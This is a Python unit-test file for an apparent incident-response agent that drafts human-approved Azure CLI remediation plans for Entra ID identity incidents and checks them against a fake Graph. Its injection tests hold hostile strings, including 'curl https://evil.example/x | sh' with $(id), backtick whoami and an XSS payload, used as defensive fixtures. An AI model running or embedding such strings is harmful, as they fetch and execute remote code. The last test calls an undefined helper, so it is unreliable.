"""IR1a (#552): the plan of an identity card and its check, read only — on a fake Graph
(tests/unit/fake_graph.py), never the real one (conftest: `no_graph`), never the model.

What is held:
  - `IDENTITY_ACTIONS`, the closed list of the verbs (§3.3): disjoint from `AUTONOMOUS_ACTIONS`,
    within `HUMAN_APPROVAL_REQUIRED`, never in what the model reads (the prompt unchanged), never
    a decision's (`_identity_decision` keeps `action: ""`; its two locks hold);
  - a plan per finding of the §3.2 table — a credential added, a consent, a privileged role, an
    unusual sign-in, Glorfindel's identity —: the verbs in their order, then the steps, each with
    its exact ids read on Graph and its complete command, its side effect and its way back;
  - a parameter neither in the row nor read is marked « not read », never invented, and its
    command says it is not complete; Graph unreadable, the plan stays useful;
  - a field of the log that is no id never reaches a command (an attacker writes a name);
  - the check: held, not held, unreadable — never held on a right missing, an error, a delay;
  - Graph read only, and only from glorfindel/providers/azure/ (MC0).
"""
from __future__ import annotations

import ast
import re
from datetime import datetime, timezone
from pathlib import Path
from types import SimpleNamespace

import pytest

from glorfindel.providers.azure import entra, entra_check, entra_plan, graph
from glorfindel.providers.azure.graph import GraphReader, NoGraph, Unreadable
from tests.unit.fake_graph import FakeGraph

ROOT = Path(__file__).resolve().parents[2]
# Placeholders, never real ids.
APP = "00000000-0000-0000-0000-0000000000c1"           # an application (its object)
APP_ID = "00000000-0000-0000-0000-0000000000c9"        # its client id
SP = "00000000-0000-0000-0000-0000000000c2"            # its service principal
RES = "00000000-0000-0000-0000-0000000000e1"           # the resource's principal (Microsoft Graph's)
ADMIN = "00000000-0000-0000-0000-0000000000b1"
USER = "00000000-0000-0000-0000-0000000000d1"
KEY = "00000000-0000-0000-0000-000000000001"
OTHER_KEY = "00000000-0000-0000-0000-000000000002"
FIC = "00000000-0000-0000-0000-0000000000f1"
ROLE_DEF = "00000000-0000-0000-0000-0000000000e9"      # a role definition (placeholder)
ASSIGNMENT = "lAPpYvVpN0KRkAEhdxReEJC2sEqbR_9Hr48lds9SGHI-1"
GRANT = "Hk-GJ6R6pU6XhsZS2Li6aaVvlMv7Kh1Gv0rB0lyiZ3E"
APP_ROLE_ASSIGNMENT = "41W1zT6z1U-kJxf62svfp1HFE8pMZhxDun-ThPczmJE"
APP_ROLE = "00000000-0000-0000-0000-0000000000a9"
AT = "2026-11-05T10:00:00Z"
NOW = datetime(2026, 11, 5, 10, 30, tzinfo=timezone.utc)
HOSTILE = "app\"; curl https://evil.example/x | sh; echo \"<img src=x onerror=alert(1)>`whoami`$(id)"


def _row(kind, **extra):
    row = {"TimeGenerated": AT, "EntraKind": kind, "Result": "success", "CorrelationId": "c-1",
           "ActorName": "admin@example.org", "ActorId": ADMIN, "ActorAppId": "", "ActorIp": "203.0.113.7"}
    if kind == "credential":
        row.update(EntraOperation="Update application – Certificates and secrets management ",
                   TargetName="app-billing", TargetId=APP, TargetType="Application",
                   CredentialAdded=f'["[KeyIdentifier={KEY},KeyType=Password,KeyUsage=Verify,DisplayName=ci]"]')
    elif kind == "consent":
        row.update(EntraOperation="Consent to application", TargetName="app-mail-reader", TargetId=SP,
                   TargetType="ServicePrincipal", Permissions="Mail.Read offline_access", AdminConsent=True)
    elif kind == "role":
        row.update(EntraOperation="Add member to role", RoleName="Global Administrator",
                   TargetName="new-admin@example.org", TargetId=USER, TargetType="User")
    elif kind == "signin":
        row.update(EntraOperation="Service principal sign-in", ActorName="sp-ci-deploy", ActorId=SP,
                   ActorAppId=APP_ID, ActorIp="198.51.100.23", TargetName="Windows Azure Service Management API",
                   TargetId="", BaselineDays=12)
    row.update(extra)
    return row


@pytest.fixture()
def tenant():
    g = FakeGraph()
    g.apps[APP] = {"id": APP, "appId": APP_ID, "displayName": "app-billing",
                   "passwordCredentials": [{"keyId": KEY, "displayName": "ci", "startDateTime": AT},
                                           {"keyId": OTHER_KEY, "displayName": "prod"}],
                   "keyCredentials": []}
    g.sps[SP] = {"id": SP, "appId": APP_ID, "displayName": "app-mail-reader", "accountEnabled": True,
                 "passwordCredentials": [], "keyCredentials": []}
    g.users[USER] = {"id": USER, "signInSessionsValidFromDateTime": "2026-10-01T00:00:00Z"}
    g.users[ADMIN] = {"id": ADMIN, "signInSessionsValidFromDateTime": "2026-10-01T00:00:00Z"}
    g.grants.append({"id": GRANT, "clientId": SP, "consentType": "AllPrincipals", "principalId": None,
                     "resourceId": RES, "scope": "Mail.Read offline_access"})
    g.app_roles[SP] = [{"id": APP_ROLE_ASSIGNMENT, "principalId": SP, "resourceId": RES, "appRoleId": APP_ROLE}]
    g.roles[ROLE_DEF] = "Global Administrator"
    g.role_assignments.append({"id": ASSIGNMENT, "principalId": USER, "roleDefinitionId": ROLE_DEF,
                               "directoryScopeId": "/"})
    return g


def _plan(row, reader, **kw):
    return entra_plan.build(row, reader, now=NOW, **kw)


def _commands(plan):
    return [i["command"] for i in plan["items"]] + [i["find"] for i in plan["items"]] + \
        [i["before"] for i in plan["items"]] + [i["rollback"] for i in plan["items"]]


# ── IDENTITY_ACTIONS: the closed list, never autonomous, never the model's ──────────────────

def test_the_identity_verbs_are_a_closed_list():
    from glorfindel.actions import IDENTITY_ACTIONS
    assert IDENTITY_ACTIONS == {"entra_remove_credential", "entra_restore_credential", "entra_disable_principal",
                                "entra_enable_principal", "entra_revoke_sessions", "entra_disable_user",
                                "entra_enable_user"}
    assert isinstance(IDENTITY_ACTIONS, frozenset)


def test_no_identity_verb_is_autonomous():
    from glorfindel.actions import AUTONOMOUS_ACTIONS, IDENTITY_ACTIONS
    assert IDENTITY_ACTIONS.isdisjoint(AUTONOMOUS_ACTIONS)


def test_every_identity_verb_requires_a_human():
    from glorfindel.actions import HUMAN_APPROVAL_REQUIRED, IDENTITY_ACTIONS
    assert IDENTITY_ACTIONS <= HUMAN_APPROVAL_REQUIRED


def test_an_identity_verb_a_decision_would_name_never_runs():
    """Past `decide`, whatever names it: the route escalates (HUMAN_APPROVAL_REQUIRED, and not
    autonomous), and the card says a destructive action."""
    from glorfindel.actions import IDENTITY_ACTIONS
    from glorfindel.agent import _route_after_decide
    sig = {"resource_id": "/subscriptions/s/resourceGroups/rg/providers/Microsoft.Compute/virtualMachines/vm1",
           "context": {}, "raw_signal": {"first_result_row": {"Computer": "vm1"}}}
    for verb in IDENTITY_ACTIONS:
        assert _route_after_decide({"signal": sig, "action": verb, "escalate": False}) == "escalate_to_human"


def test_the_model_reads_no_identity_verb_and_its_prompt_is_unchanged():
    """The prompt is what it was before IR1a (an edit of it waits for a run end to end): the gated
    actions it names are a decision's, the identity verbs left out."""
    import json

    from glorfindel import agent
    from glorfindel.actions import IDENTITY_ACTIONS, MODEL_GATED_ACTIONS
    tool = json.dumps(agent._DECISION_TOOL)
    for verb in IDENTITY_ACTIONS:
        assert verb not in agent._SYSTEM_PROMPT and verb not in tool
    assert MODEL_GATED_ACTIONS == {"delete_resource", "modify_network_rule", "escalate_permissions",
                                   "wipe_storage", "restore_from_backup"}
    assert f"Destructive actions {sorted(MODEL_GATED_ACTIONS)}" in agent._SYSTEM_PROMPT


# The sha256 of what the model reads, rendered at 982af36d (before IR1a) and after: the source
# changed (MODEL_GATED_ACTIONS), the text did not — the proof that spares the run end to end
# (CLAUDE.md, Conventions; Jonathan's decision of 05/11). An edit of the prompt changes them: then
# the run end to end, and these digests updated with it.
PROMPT_SHA256 = "36b767e85ac8ac327e2b630055787536f70d37c2d631421f7734c8ec1d24fb86"
TOOL_SHA256 = "e14c15f091757c070e45c9854d558fa3b049915e54fc7f7f80c8f86d3d6617c2"


def test_what_the_model_reads_is_byte_for_byte_what_it_was_before_ir1a():
    import hashlib
    import json

    from glorfindel import agent
    assert hashlib.sha256(agent._SYSTEM_PROMPT.encode()).hexdigest() == PROMPT_SHA256
    assert hashlib.sha256(json.dumps(agent._DECISION_TOOL, sort_keys=True).encode()).hexdigest() == TOOL_SHA256


def test_the_identity_decision_keeps_no_action_and_its_plan_never_reaches_the_model(monkeypatch, tenant):
    from glorfindel import agent
    monkeypatch.setattr(graph, "default_reader", lambda: tenant)
    row = entra.prepare_rows([_row("credential")], set())[0]
    sig = {"resource_id": "/subscriptions/s/resourceGroups/rg/providers/Microsoft.Compute/virtualMachines/vm1",
           "severity": "high", "context": {"plane": "identity"},
           "raw_signal": {"detection_source": "azure_entra", "first_result_row": row}}
    d = agent._identity_decision({"signal": sig, "dry_run": False})
    assert d["action"] == "" and d["escalate"] is True and d["held_by"] == "identity"
    plan = d["identity_plan"]
    assert plan["items"][0]["verb"] == "entra_remove_credential"
    assert f"az ad app credential delete --id {APP} --key-id {KEY}" in " ".join(d["suggested_steps"])
    # dry run: Graph never read, said
    dry = agent._identity_decision({"signal": sig, "dry_run": True})["identity_plan"]
    assert dry["graph"] == {"read": False, "why": "dry run : Graph non lu"}


# ── The plan, per finding (§3.2) ────────────────────────────────────────────────────────────

def test_a_credential_added_its_removal_with_the_keyid_read_on_graph(tenant):
    plan = _plan(_row("credential"), tenant)
    assert plan["graph"] == {"read": True, "why": ""}
    first = plan["items"][0]
    assert (first["verb"], first["by"]) == ("entra_remove_credential", "executor")
    assert first["command"] == f"az ad app credential delete --id {APP} --key-id {KEY}" and first["complete"]
    assert {p["name"]: p["from"] for p in first["params"]} == {"id de l'objet": "log", "keyId": "graph"}
    assert "ne revient pas" in first["rollback"] and first["side_effect"]
    assert first["check"] == {"kind": "credential_gone", "collection": "applications", "id": APP, "key_id": KEY}
    # then the steps for a human: the other credentials, if the author is not expected
    assert [i["by"] for i in plan["items"]] == ["executor", "human"] and plan["items"][1]["optional"]
    assert [i["n"] for i in plan["items"]] == [1, 2]


def test_a_certificate_added_is_removed_with_its_public_part_kept_before(tenant):
    tenant.apps[APP]["keyCredentials"] = [{"keyId": KEY}]
    tenant.apps[APP]["passwordCredentials"] = []
    plan = _plan(_row("credential", CredentialAdded=f"[KeyIdentifier={KEY},KeyType=AsymmetricX509Cert]"), tenant)
    first = plan["items"][0]
    assert first["command"].endswith("--cert") and f"keycredentials-{APP}.json" in first["before"]
    assert "--cert @" in first["rollback"]


def test_a_federated_credential_is_found_by_its_name_on_graph(tenant):
    tenant.fics[APP] = [{"id": FIC, "name": "gh-main", "issuer": "https://token.actions.example"}]
    plan = _plan(_row("credential", CredentialAdded='[{"Name":"gh-main","Issuer":"https://token.actions.example"}]'),
                 tenant)
    first = plan["items"][0]
    assert first["command"] == f"az ad app federated-credential delete --id {APP} --federated-credential-id {FIC}"
    assert f"fic-{FIC}.json" in first["before"] and "federated-credential create" in first["rollback"]
    assert first["check"] == {"kind": "federated_gone", "id": APP, "fic_id": FIC}


def test_a_consent_disables_the_client_never_the_resource_and_lists_each_grant(tenant):
    plan = _plan(_row("consent"), tenant)
    by = [(i["verb"], i["by"]) for i in plan["items"]]
    assert by[0] == ("entra_disable_principal", "executor")
    assert plan["items"][0]["command"] == f"az ad sp update --id {SP} --set accountEnabled=false"
    assert "il est actif (lu dans Graph)" in plan["items"][0]["rollback"]
    cmds = " ".join(_commands(plan))
    assert RES not in plan["items"][0]["command"] and f"--id {RES}" not in cmds
    grant = next(i for i in plan["items"] if i["check"] and i["check"]["kind"] == "grant_gone")
    assert grant["command"] == f"az rest --method DELETE --url https://graph.microsoft.com/v1.0/oauth2PermissionGrants/{GRANT}"
    assert f'"clientId":"{SP}","consentType":"AllPrincipals","principalId":null,"resourceId":"{RES}"' in grant["rollback"]
    role = next(i for i in plan["items"] if i["check"] and i["check"]["kind"] == "assignment_gone")
    assert f"servicePrincipals/{RES}/appRoleAssignedTo/{APP_ROLE_ASSIGNMENT}" in role["command"]
    assert f'"appRoleId":"{APP_ROLE}"' in role["rollback"]
    sessions = next(i for i in plan["items"] if i["verb"] == "entra_revoke_sessions")
    assert sessions["by"] == "human" and "IDI1b" in sessions["why_human"]        # a user: never the executor's
    assert sessions["command"] == f"az rest --method POST --url https://graph.microsoft.com/v1.0/users/{ADMIN}/revokeSignInSessions"
    assert all(i["complete"] for i in plan["items"] if i["command"])


def test_a_consent_outside_its_flow_names_no_client_and_blocks_nothing(tenant):
    plan = _plan(_row("consent", EntraOperation="Add delegated permission grant", TargetId=RES), tenant)
    assert not any(i["verb"] == "entra_disable_principal" for i in plan["items"])
    assert "Identifier l'application cliente" in plan["items"][0]["what"]


def test_a_privileged_role_its_assignment_read_and_the_members_sessions(tenant):
    plan = _plan(_row("role"), tenant)
    assert not [i for i in plan["items"] if i["by"] == "executor"]          # a role: never Eregion's
    remove = plan["items"][0]
    assert remove["command"] == ("az rest --method DELETE --url https://graph.microsoft.com/v1.0/roleManagement/"
                                 f"directory/roleAssignments/{ASSIGNMENT}")
    assert f'"principalId":"{USER}","roleDefinitionId":"{ROLE_DEF}","directoryScopeId":"/"' in remove["rollback"]
    assert remove["check"] == {"kind": "role_gone", "member": USER, "role_definition_id": ROLE_DEF, "template_id": "",
                               "role_name": "Global Administrator", "eligible": False}
    revokes = [i for i in plan["items"] if i["verb"] == "entra_revoke_sessions"]
    assert [(r["target"]["id"], r["optional"]) for r in revokes] == [(USER, False), (ADMIN, True)]


def test_an_eligible_role_is_removed_by_a_schedule_request(tenant):
    tenant.role_assignments.clear()
    tenant.eligibilities.append({"id": "elig-1", "principalId": USER, "roleDefinitionId": ROLE_DEF,
                                 "directoryScopeId": "/",
                                 "scheduleInfo": {"expiration": {"endDateTime": "2027-01-01T00:00:00Z"}}})
    plan = _plan(_row("role", EntraOperation="Add eligible member to role"), tenant)
    remove = plan["items"][0]
    assert "roleEligibilityScheduleRequests" in remove["command"] and '"action":"adminRemove"' in remove["command"]
    assert '"action":"adminAssign"' in remove["rollback"] and "2027-01-01T00:00:00Z" in remove["rollback"]
    assert remove["check"]["eligible"] is True


def test_an_unusual_signin_removes_the_credential_it_used_else_blocks_the_principal(tenant):
    tenant.apps[APP]["passwordCredentials"] = [{"keyId": KEY}]
    used = _plan(_row("signin", ServicePrincipalCredentialKeyId=KEY), tenant)
    assert used["items"][0]["command"] == f"az ad app credential delete --id {APP} --key-id {KEY}"
    none = _plan(_row("signin"), tenant)
    assert none["items"][0]["verb"] == "entra_disable_principal"
    assert none["items"][0]["command"] == f"az ad sp update --id {SP} --set accountEnabled=false"


@pytest.mark.parametrize("mark", ["GlorfindelIdentity", "GlorfindelManaged"])
@pytest.mark.parametrize("kind", ["credential", "signin"])
def test_glorfindels_identity_no_verb_of_the_executor_its_credentials_renewed(tenant, mark, kind):
    plan = _plan(_row(kind, **{mark: True}), tenant)
    assert all(i["by"] == "human" for i in plan["items"])
    assert "Renouveler les identifiants de Glorfindel" in plan["items"][0]["what"]
    assert not any(i["verb"] in ("entra_disable_principal", "entra_disable_user") for i in plan["items"])


def test_never_target_turns_a_verb_into_a_humans_step(tenant):
    plan = _plan(_row("consent"), tenant, protected=lambda oid: "jamais ciblée" if oid == SP else "")
    first = next(i for i in plan["items"] if i["verb"] == "entra_disable_principal")
    assert first["by"] == "human" and first["why_human"] == "jamais ciblée"


def test_never_target_unreadable_covers_every_identity():
    """No operator named (H0 today): the list refuses every identity — every verb a human's."""
    protected = entra_plan.never_target_protected({})
    assert "illisible" in protected(SP)
    named = entra_plan.never_target_protected({"EREGION_OPERATOR_OBJECT_ID": ADMIN})
    assert named(SP) == "" and named(ADMIN)


# ── What is not read: marked, never invented ────────────────────────────────────────────────

def test_without_graph_the_plan_stays_useful_and_marks_what_it_did_not_read():
    """H0 today: no right on Graph. The keyId comes from the log (an id, checked); what only
    Graph would give — a grant's id — is marked « not read », its command not complete."""
    plan = _plan(_row("credential"), NoGraph("droit absent sur Graph (403)"))
    assert plan["graph"] == {"read": False, "why": "droit absent sur Graph (403)"}
    first = plan["items"][0]
    assert first["complete"] and {p["name"]: p["from"] for p in first["params"]}["keyId"] == "log"
    assert "non confirmé dans Graph" in first["params"][1]["note"]
    consent = _plan(_row("consent"), NoGraph("droit absent sur Graph (403)"))
    grant = next(i for i in consent["items"] if i["check"] and i["check"]["kind"] == "consent_gone")
    assert not grant["complete"] and "oauth2PermissionGrants/<id-de-l-octroi>" in grant["command"]
    assert grant["params"][0] == {"name": "id de l'octroi", "value": "", "from": "", "read": False,
                                  "why": "droit absent sur Graph (403)"}
    assert "az ad app permission list-grants --id" in grant["find"]
    text = " ".join(entra_plan.steps_text(consent))
    assert "non lu : id de l'octroi" in text and "Graph non lu" in text


def test_a_keyid_the_log_does_not_give_is_never_chosen_among_the_credentials(tenant):
    plan = _plan(_row("credential", CredentialAdded="[KeyType=Password]"), tenant)
    first = plan["items"][0]
    assert not first["complete"] and first["check"] is None and first["verifiable"]
    assert "--key-id <keyId>" in first["command"]
    assert {c["keyId"] for c in first["candidates"]} == {KEY, OTHER_KEY}       # shown, not chosen


def test_a_role_without_its_name_is_never_guessed(tenant):
    plan = _plan(_row("role", RoleName=""), tenant)
    assert not plan["items"][0]["complete"] and plan["items"][0]["check"] is None
    assert "le journal ne nomme pas le rôle" in plan["items"][0]["params"][0]["why"]


# ── A field of the log that is no id never reaches a command ────────────────────────────────

@pytest.mark.parametrize("kind", ["credential", "consent", "role", "signin"])
def test_a_hostile_field_of_the_log_never_reaches_a_command(tenant, kind):
    hostile = {"TargetId": HOSTILE, "TargetName": HOSTILE, "ActorId": HOSTILE, "ActorName": HOSTILE,
               "ActorAppId": "", "ClientId": HOSTILE, "RoleName": HOSTILE, "TimeGenerated": HOSTILE,
               "CredentialAdded": f"[KeyIdentifier={HOSTILE},KeyType=Password]",
               "ServicePrincipalCredentialKeyId": HOSTILE, "CorrelationId": HOSTILE}
    plan = _plan(_row(kind, **hostile), tenant)
    for cmd in _commands(plan):
        assert not re.search(r"evil|curl|whoami|\$\(|`|<img|;\s*echo", cmd), cmd
    # what is no id is said, never used
    params = [p for i in plan["items"] for p in i["params"] if not p["read"]]
    if kind in ("credential", "role", "signin"):
        assert any("n'est pas un identifiant" in p["why"] for p in params), params
    assert HOSTILE not in plan["correlation_id"] or len(plan["correlation_id"]) <= 120


def test_a_hostile_scope_from_graph_never_reaches_a_command(tenant):
    tenant.grants[0]["scope"] = "Mail.Read' ; curl https://evil.example | sh ; '"
    plan = _plan(_row("consent"), tenant)
    assert not any("evil" in c for c in _commands(plan))


# ── The check: held, not held, unreadable ───────────────────────────────────────────────────

def test_verify_not_held_until_the_gesture_then_held(tenant):
    plan = _plan(_row("credential"), tenant)
    before = entra_check.verify(plan, tenant, now=NOW)
    assert before["verdict"] == "not_held" and before["items"][0]["state"] == "not_held"
    tenant.apps[APP]["passwordCredentials"] = [c for c in tenant.apps[APP]["passwordCredentials"]
                                               if c["keyId"] != KEY]
    after = entra_check.verify(plan, tenant, now=NOW)
    assert after["verdict"] == "held" and after["items"][0]["state"] == "held"


@pytest.mark.parametrize("fail", ["right", "error", "delay", "crash"])
def test_verify_says_unreadable_never_held_when_graph_is_not_read(tenant, fail):
    plan = _plan(_row("credential"), tenant)
    tenant.apps[APP]["passwordCredentials"] = []          # the gesture made — yet Graph unread
    tenant.fail = fail
    out = entra_check.verify(plan, tenant, now=NOW)
    assert out["verdict"] == "unreadable"
    assert all(i["state"] == "unreadable" for i in out["items"])


def test_verify_without_any_reader_is_unreadable(tenant):
    out = entra_check.verify(_plan(_row("credential"), tenant), None, now=NOW)
    assert out["verdict"] == "unreadable"


def test_a_check_the_plan_could_not_write_is_unreadable_never_held(tenant):
    plan = _plan(_row("credential", CredentialAdded="[KeyType=Password]"), tenant)
    tenant.apps[APP]["passwordCredentials"] = []
    out = entra_check.verify(plan, tenant, now=NOW)
    assert out["items"][0]["state"] == "unreadable" and out["verdict"] == "unreadable"


def test_verify_a_consent_role_and_sessions(tenant):
    consent = _plan(_row("consent"), tenant)
    assert entra_check.verify(consent, tenant, now=NOW)["verdict"] == "not_held"
    tenant.sps[SP]["accountEnabled"] = False
    tenant.grants.clear()
    tenant.app_roles[SP] = []
    tenant.users[ADMIN]["signInSessionsValidFromDateTime"] = "2026-11-05T10:05:00Z"
    assert entra_check.verify(consent, tenant, now=NOW)["verdict"] == "held"
    role = _plan(_row("role"), tenant)
    tenant.role_assignments.clear()
    out = entra_check.verify(role, tenant, now=NOW)
    # the member's sessions not revoked yet: not held; the author's (optional) not counted
    assert out["verdict"] == "not_held"
    tenant.users[USER]["signInSessionsValidFromDateTime"] = "2026-11-05T10:06:00Z"
    tenant.users[ADMIN]["signInSessionsValidFromDateTime"] = "2026-10-01T00:00:00Z"
    out = entra_check.verify(role, tenant, now=NOW)
    assert out["verdict"] == "held" and any(i["optional"] and i["state"] == "not_held" for i in out["items"])


def test_a_revocation_before_the_event_is_not_held(tenant):
    plan = _plan(_row("role"), tenant)
    out = entra_check.verify(plan, tenant, now=NOW)
    member = next(i for i in out["items"] if "new-admin" in i["what"])
    assert member["state"] == "not_held" and "avant l'événement" in member["why"]


def test_a_plan_with_nothing_to_check_is_unreadable_and_says_why():
    plan = _plan({"EntraKind": "other", "EntraOperation": "x"}, None)
    out = entra_check.verify(plan, FakeGraph(), now=NOW)
    assert out["verdict"] == "unreadable" and out["why"] == "rien que Graph puisse vérifier dans ce plan"


def test_a_check_rebuilds_its_path_from_ids_only():
    """A plan read from the store names no path: a check whose id is no id is refused unread."""
    g = FakeGraph()
    for check in ({"kind": "credential_gone", "collection": "applications", "id": "../users", "key_id": KEY},
                  {"kind": "disabled", "collection": "groups", "id": SP},
                  {"kind": "grant_gone", "client": SP, "grant_id": "a/b"}):
        assert entra_check.check_item(check, g)["state"] == "unreadable"
    assert g.calls == []


# ── Graph: read only, its answers, and only in the adapter ───────────────────────────────────

class _Resp:
    def __init__(self, status, body=None):
        self.status_code, self._body = status, body

    def json(self):
        if isinstance(self._body, Exception):
            raise self._body
        return self._body


class _Session:
    def __init__(self, *answers):
        self.answers, self.urls = list(answers), []

    def get(self, url, headers=None, params=None, timeout=None, allow_redirects=True):
        self.urls.append(url)
        self.redirects = allow_redirects
        a = self.answers.pop(0)
        if isinstance(a, Exception):
            raise a
        return a


def _reader(*answers):
    s = _Session(*answers)
    cred = SimpleNamespace(get_token=lambda scope: SimpleNamespace(token="t"))
    return GraphReader(credential=cred, session=s), s


def test_the_reader_answers_an_object_an_absence_or_unreadable():
    import requests
    r, s = _reader(_Resp(200, {"id": APP}), _Resp(404), _Resp(403, {"error": {"code": "Authorization_RequestDenied"}}),
                   _Resp(503), requests.Timeout(), requests.ConnectionError(), _Resp(200, ValueError("x")))
    assert r.get(f"/applications/{APP}") == {"id": APP}
    assert r.get(f"/applications/{APP}") is None
    for kind in ("right", "error", "delay", "delay", "error"):
        with pytest.raises(Unreadable) as exc:
            r.get(f"/applications/{APP}")
        assert exc.value.kind == kind
    assert all(u.startswith("https://graph.microsoft.com/v1.0/") for u in s.urls)


def test_the_reader_follows_pages_on_graph_only_and_refuses_a_truncated_list():
    r, _ = _reader(_Resp(200, {"value": [{"id": 1}], "@odata.nextLink": "https://evil.example/next"}))
    with pytest.raises(Unreadable):
        r.list("/oauth2PermissionGrants")
    pages = [_Resp(200, {"value": [{"id": n}], "@odata.nextLink": f"{graph.GRAPH}/x?page={n}"})
             for n in range(graph.MAX_PAGES)]
    r, _ = _reader(*pages)
    with pytest.raises(Unreadable):
        r.list("/oauth2PermissionGrants")
    r, _ = _reader(_Resp(200, {"value": [{"id": 1}], "@odata.nextLink": f"{graph.GRAPH}/x"}),
                   _Resp(200, {"value": [{"id": 2}]}))
    assert r.list("/oauth2PermissionGrants") == [{"id": 1}, {"id": 2}]


def test_a_token_that_cannot_be_had_is_unreadable():
    def boom(scope):
        raise RuntimeError("no identity")
    r = GraphReader(credential=SimpleNamespace(get_token=boom), session=_Session())
    with pytest.raises(Unreadable) as exc:
        r.get(f"/users/{USER}")
    assert exc.value.kind == "right"


def test_the_graph_module_only_reads():
    """No method of the reader writes, and no HTTP verb but GET is written in it."""
    src = (ROOT / "glorfindel/providers/azure/graph.py").read_text()
    calls = {n.func.attr for n in ast.walk(ast.parse(src)) if isinstance(n, ast.Call)
             and isinstance(n.func, ast.Attribute)}
    assert not calls & {"post", "patch", "put", "delete", "request"}
    assert not re.search(r"""method\s*=|["'](POST|PATCH|PUT|DELETE)["']""", src)


def test_graph_is_read_only_from_the_azure_adapter():
    """MC0: Graph's host only in glorfindel/providers/azure/ — the console never reads Graph, nor
    the shared core (IDI1's Orodruin reads it for its own contract: a known crossing)."""
    hits = []
    for d in ("glorfindel", "eregion_console"):
        for p in (ROOT / d).rglob("*"):
            if p.suffix in (".py", ".js", ".html") and "graph.microsoft.com" in p.read_text(encoding="utf-8"):
                hits.append(p.relative_to(ROOT).as_posix())
    assert hits and all(h.startswith("glorfindel/providers/azure/") for h in hits), hits


# ── Relecture 1 (05/11) : a role by its alias, a step Graph cannot check, the budget, an absence ──

def test_a_role_logged_under_its_former_name_is_found_and_never_held_while_assigned(tenant):
    """C2 keeps « Company Administrator » — Graph names it Global Administrator: the same role."""
    plan = _plan(_row("role", RoleName="Company Administrator"), tenant)
    remove = plan["items"][0]
    assert remove["complete"] and remove["command"].endswith(f"roleAssignments/{ASSIGNMENT}")
    assert entra_check.verify(plan, tenant, now=NOW)["items"][0]["state"] == "not_held"
    by_name = entra_check.check_item({"kind": "role_gone", "member": USER, "role_name": "Company Administrator",
                                      "eligible": False}, tenant)
    assert by_name["state"] == "not_held"


def test_an_assignment_whose_role_is_not_read_is_a_candidate_never_held(tenant):
    """The role's name not read (roleDefinition not expanded): never « already removed? », never held."""
    tenant.roles.clear()                                     # the definition comes back without a name
    plan = _plan(_row("role"), tenant)
    remove = plan["items"][0]
    assert not remove["complete"] and "déjà retirée" not in remove["params"][0]["why"]
    assert "aucune lue sous le nom" in remove["params"][0]["why"]
    assert [c["id"] for c in remove["candidates"]] == [ASSIGNMENT]
    assert entra_check.verify(plan, tenant, now=NOW)["items"][0]["state"] == "unreadable"
    tenant.role_assignments.clear()
    assert entra_check.verify(plan, tenant, now=NOW)["items"][0]["state"] == "held"


def test_a_member_with_other_roles_is_shown_them_never_already_removed(tenant):
    tenant.roles["00000000-0000-0000-0000-0000000000e8"] = "Security Reader"
    tenant.role_assignments[0]["roleDefinitionId"] = "00000000-0000-0000-0000-0000000000e8"
    plan = _plan(_row("role"), tenant)
    remove = plan["items"][0]
    assert "le membre tient 1 attribution(s)" in remove["params"][0]["why"]
    assert remove["candidates"][0]["name"] == "Security Reader"


def test_a_consent_without_its_client_is_never_held_whatever_else_holds(tenant):
    """Its client not named, the grant may stand: the card is unreadable, never held, even with the
    consenter's sessions revoked."""
    tenant.users[ADMIN]["signInSessionsValidFromDateTime"] = "2026-11-05T10:20:00Z"
    plan = _plan(_row("consent", EntraOperation="Add delegated permission grant", TargetId=RES), tenant)
    out = entra_check.verify(plan, tenant, now=NOW)
    assert out["verdict"] == "unreadable"
    first = out["items"][0]
    assert first["state"] == "unreadable" and first["why"].startswith("Graph ne peut pas le vérifier")


def test_glorfindels_plan_is_never_held_its_renewal_unchecked(tenant):
    plan = _plan(_row("credential", GlorfindelManaged=True), tenant)
    tenant.apps[APP]["passwordCredentials"] = []
    out = entra_check.verify(plan, tenant, now=NOW)
    assert out["verdict"] == "unreadable"
    assert out["items"][0]["why"].startswith("Graph ne peut pas le vérifier")


def test_a_review_stays_out_of_the_verdict(tenant):
    plan = _plan(_row("role"), tenant)
    out = entra_check.verify(plan, tenant, now=NOW)
    assert not any(i["what"].startswith("Revoir") for i in out["items"])


@pytest.mark.parametrize("obj", [None, {"id": APP}, {"id": APP, "passwordCredentials": None, "keyCredentials": []}])
def test_a_credential_check_with_no_field_or_no_object_is_unreadable(obj):
    g = FakeGraph()
    if obj is not None:
        g.apps[APP] = obj
    out = entra_check.check_item({"kind": "credential_gone", "collection": "applications", "id": APP,
                                  "key_id": KEY}, g)
    assert out["state"] == "unreadable"


def test_a_grant_list_graph_did_not_give_is_unreadable(monkeypatch):
    g = FakeGraph()
    monkeypatch.setattr(g, "list", lambda path, params=None, deadline=None: None)
    for check in ({"kind": "grant_gone", "client": SP, "grant_id": GRANT}, {"kind": "consent_gone", "client": SP}):
        assert entra_check.check_item(check, g)["state"] == "unreadable"


class _Clock:
    def __init__(self):
        self.t = 1000.0

    def __call__(self):
        return self.t


class _SlowSession:
    """A Graph that waits: each read takes `wait` seconds of the clock, cut at its timeout."""

    def __init__(self, clock, wait, answer):
        self.clock, self.wait, self.answer, self.calls = clock, wait, answer, 0

    def get(self, url, headers=None, params=None, timeout=None, allow_redirects=True):
        import requests
        self.calls += 1
        if self.wait >= timeout[1]:
            self.clock.t += timeout[1]
            raise requests.Timeout()
        self.clock.t += self.wait
        return _Resp(self.answer)


def _queue_time(monkeypatch, wait, answer):
    """How long an identity card holds the queue of its anchor VM (`decide`), on the clock."""
    import time

    from glorfindel import agent
    clock = _Clock()
    monkeypatch.setattr(time, "monotonic", clock)
    session = _SlowSession(clock, wait, answer)
    cred = SimpleNamespace(get_token=lambda scope: SimpleNamespace(token="t"))
    monkeypatch.setattr(graph, "default_reader", lambda: GraphReader(credential=cred, session=session))
    row = entra.prepare_rows([_row("consent")], set())[0]
    sig = {"resource_id": "/subscriptions/s/resourceGroups/rg/providers/Microsoft.Compute/virtualMachines/vm1",
           "severity": "high", "context": {"plane": "identity"},
           "raw_signal": {"detection_source": "azure_entra", "first_result_row": row}}
    start = clock.t
    d = agent._identity_decision({"signal": sig, "dry_run": False})
    assert d["action"] == "" and d["identity_plan"]["graph"]["read"] is False
    return clock.t - start, session.calls


def test_a_mute_graph_holds_the_anchor_vms_queue_one_read_only(monkeypatch):
    elapsed, calls = _queue_time(monkeypatch, wait=60, answer=200)
    assert calls == 1 and elapsed <= 15


def test_a_slow_graph_holds_the_anchor_vms_queue_less_than_25_s(monkeypatch):
    elapsed, calls = _queue_time(monkeypatch, wait=9, answer=503)
    assert elapsed < 25 and elapsed <= entra_plan_budget()


